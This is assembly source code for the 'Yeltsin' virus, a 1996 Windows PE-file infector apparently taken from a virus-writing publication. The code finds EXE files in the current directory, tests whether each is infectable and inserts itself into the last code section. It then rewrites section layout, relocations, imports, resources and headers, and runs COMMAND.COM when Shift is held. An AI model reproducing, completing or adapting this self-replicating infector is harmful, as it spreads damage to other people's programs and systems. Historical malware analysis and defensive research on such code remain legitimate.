;The Yeltsin virus - like its namesake, a "good" virus that doesn't do
;                    anything good.
;
;(C) 1996 American Eagle Publications, Inc. All Rights Reserved.
;
;This virus is named after Boris Yeltsin, the undercover communist who
;is the president of the Commonwealth of Independent States.
;
.386
locals
jumps
.model flat,STDCALL

;*****************************************************************************
;*****************************************************************************
;The host for the virus loader starts here. This program assembles to look
;exactly what an infection would look like if it were dynamically performed.

INCLUDE HOST2.INC

;*****************************************************************************
;*****************************************************************************
;The Yeltsin Virus starts here.

;Definitions for the virus
MAX_PATH        EQU     255H            ;maximum path length in Win 95/NT
OPEN_EXISTING   EQU     3               ;flag for CreateFile to open existing file
GENERIC_READ    EQU     80000000H       ;flags for CreateFile
GENERIC_WRITE   EQU     40000000H
FATTR_NORMAL    EQU     0               ;normal file attribute for CreateFile
VK_SHIFT        EQU     10H             ;shift key code

PE_SIZE         EQU     248             ;size of PE file header
SEC_SIZE        EQU     40              ;size of a section header
FB_SIZE         EQU     1024            ;size of workspace for file reading

;Stack frame definitions:
SRCH_HANDLE     EQU     0               ;handle for file search functions
TEMP            EQU     SRCH_HANDLE+4   ;temporary storage location
FHANDLE         EQU     TEMP+4          ;handle for file open/read/write/close
OLD_RAW         EQU     FHANDLE+4       ;old raw data size of section being infected
IOBYTES         EQU     OLD_RAW+4
SECTION         EQU     IOBYTES+4
IBR             EQU     SECTION+1       ;this needs 8 bytes
IID             EQU     SECTION+1       ;same place as IBR, this needs 20 bytes
FIND_DATA       EQU     IID+20          ;file search data structure
;typedef struct _WIN32_FIND_DATA {
;   DWORD dwFileAttributes;
;   FILETIME ftCreationTime;            ;DD ?,?
;   FILETIME ftLastAccessTime;          ;DD ?,?
;   FILETIME ftLastWriteTime;           ;DD ?,?
;   DWORD nFileSizeHigh;
;   DWORD nFileSizeLow;
;   DWORD dwReserved0;
;   DWORD dwReserved1;
;   CHAR cFileName[MAX_PATH];
;   CHAR cAlternateFileName[ 14 ];
;} WIN32_FIND_DATA
HDRBUF          EQU     FIND_DATA+11*4+14+MAX_PATH
FILEBUF         EQU     HDRBUF+FB_SIZE          ;Need 4K here
RELBUF          EQU     FILEBUF+4*FB_SIZE+3     ;Max size needed is 2K
WORKSP          EQU     RELBUF+2*FB_SIZE

;The virus code itself starts right here. Control is passed here when the
;program starts up. This is the main control routine, which performs the
;infection and then passes control to the host

VIRUS:  pushad
        call    RELOC
RELOC:  pop     edi                     ;edi contains relocation address for virus
        sub     edi,OFFSET RELOC
        sub     esp,WORKSP              ;set up temporary data area on stack
        mov     ebp,esp

        call    FIND_FIRST_EXE          ;find a file
        jz      EXIT                    ;no more files to infect, exit to host
INFECT: call    INFECT_FILE             ;infect the file we've found
        call    FIND_NEXT_EXE           ;find another file
        jnz     INFECT

EXIT:   push    LARGE VK_SHIFT
        call    DWORD PTR [edi+GET_ASYNC_KEY_STATE]
        or      eax,eax
        jz      EXIT2

        push    LARGE SW_SHOWNORMAL
        lea     eax,[edi+OFFSET COMCOM]
        push    eax
        call    DWORD PTR [edi+WIN_EXEC]

EXIT2:  add     esp,WORKSP
        popad                           ;get rid of temporary data area
HADDR:  jmp     HOST                    ;this address is dynamically modified by the virus

COMCOM  db      'C:\COMMAND.COM',0

;******************************************************************************
;The following routines search for EXE files to infect. FIND_FIRST_EXE is
;called first, followed by repeated calls to FIND_NEXT_EXE until there are
;no more files to infect. These routines return with Z set when there are
;no more EXE files available.
FIND_FIRST_EXE:
        lea     eax,[ebp+FIND_DATA]     ;perform FindFirst function
        push    eax
        lea     eax,[edi+OFFSET EXE_FILE]
        push    eax
        call    DWORD PTR [edi+FIND_FIRST_FILE]
        mov     [ebp+SRCH_HANDLE],eax
        cmp     eax,-1                  ;check for invalid handle
        ret

FIND_NEXT_EXE:
        lea     eax,[ebp+FIND_DATA]     ;now perform FindNext function
        push    eax
        mov     eax,[ebp+SRCH_HANDLE]
        push    eax
        call    DWORD PTR [edi+FIND_NEXT_FILE]
        or      eax,eax
        ret

EXE_FILE        DB      '*.EXE',0

;This routine checks to see if the PE file in question can be infected. It
;just checks to see if there is room in its memory to hold the PE header and
;the section headers, and if the Yeltsin code is already at the entry point.
CAN_INFECT:
        mov     eax,esi
        sub     eax,HDRBUF
        add     eax,PE_SIZE             ;eax = size of DOS header + PE header
        mov     ebx,eax                 ;save it here

        xor     eax,eax
        mov     ax,[ebp+esi+6]          ;get actual section count
        mov     ecx,SEC_SIZE            ;determine the size of section headers
        mul     ecx
        add     eax,ebx                 ;eax=size of all header info needed

        cmp     eax,FB_SIZE             ;will it fit in HDRBUF?
        jnc     CINO                    ;nope, exit with NZ set - don't infect
                                ;now check to see if already infected
        mov     eax,[ebp+esi+40]        ;get entry point
        call    RVA_TO_FILEPTR          ;find entry point in file
        call    FILE_SEEK
        mov     ecx,12
        lea     edx,[ebp+FILEBUF]       ;read 12 bytes from entry point
        call    FILE_READ
        mov     eax,[ebp+FILEBUF]
        cmp     eax,[edi+OFFSET VIRUS]  ;compare 4 bytes
        jne     CIYES
        mov     eax,[ebp+FILEBUF+4]
        cmp     eax,[edi+OFFSET VIRUS+4];and 4 more
        jne     CIYES
        mov     eax,[ebp+FILEBUF+8]
        cmp     eax,[edi+OFFSET VIRUS+8];and 4 more
        je      CINO

CIYES:  xor     al,al                   ;clear to infect, set z and return
        ret
CINO:   mov     al,1
        or      eax,eax                 ;don't infect, return with NZ
        ret


;This routine infects the file found by FIND_FIRST_EXE and FIND_NEXT_EXE, if
;it can. First it must check to see if the file is infectable. To be infectable,
;the file must be a 32-bit Portable Executable, and the virus must not already
;be present.

INFECT_FILE:
        call    OPEN_FILE               ;open the EXE file specified in FIND_DATA
        jz      IFEX1                   ;successful? no, just exit
        mov     [ebp+FHANDLE],eax       ;save handle here
        call    IS_PE_FILE              ;check to see if this is a PE file (also sets ebp+esi->PE header)
        jnz     IFEX                    ;no, close file and exit
        call    CAN_INFECT              ;check to see if it can be infected
        jz      _IF1                    ;yes, go do it

IFEX:   push    DWORD PTR [ebp+FHANDLE] ;exit INFECT_FILE routine
        call    DWORD PTR [edi+LCLOSE]  ;close the file
IFEX1:  ret                             ;and return to caller

;If we get here, we have a valid 32-bit file with a PE header, and the
;virus is not present. The infection process may begin. The infection process
;is broken out into various procedures.
_IF1:
        call    FIND_LAST_EXEC          ;find the last executable code section
        jc      IFEX                    ;if there isn't one, just exit
        mov     [ebp+SECTION],al        ;else store section number here
        push    eax
        mov     ecx,eax
        dec     ecx
        call    GET_SEC_PTR             ;ebx points to section header
        mov     eax,[ebp+ebx+16]        ;get original raw data size for this section
        mov     [ebp+OLD_RAW],eax       ;and save it here
        pop     eax
        call    MOVE_SECTIONS           ;move all sections after the one being infected
        call    INSERT_VIRUS            ;insert the virus in the code section
        call    GET_VMSIZE              ;see if relocations need updating
        or      eax,eax                 ;if eax=0, all is well
        jz      _IF2                    ;so update header and exit
        call    UPDATE_IMG_DAT_DIR      ;update image data directory in memory
        call    UPDATE_RELOCATIONS      ;else update the relocations
        call    UPDATE_IMPORTS          ;and the imports
        call    UPDATE_RESOURCES        ;and the resources
_IF2:   call    UPDATE_PE_HEADER        ;write new PE header to disk
        jmp     IFEX                    ;and exit infect routine

INCLUDE INFECT.INC
INCLUDE BASICS.INC

VIR_SIZE        EQU     $ - OFFSET VIRUS

        ends

        end     VIRUS
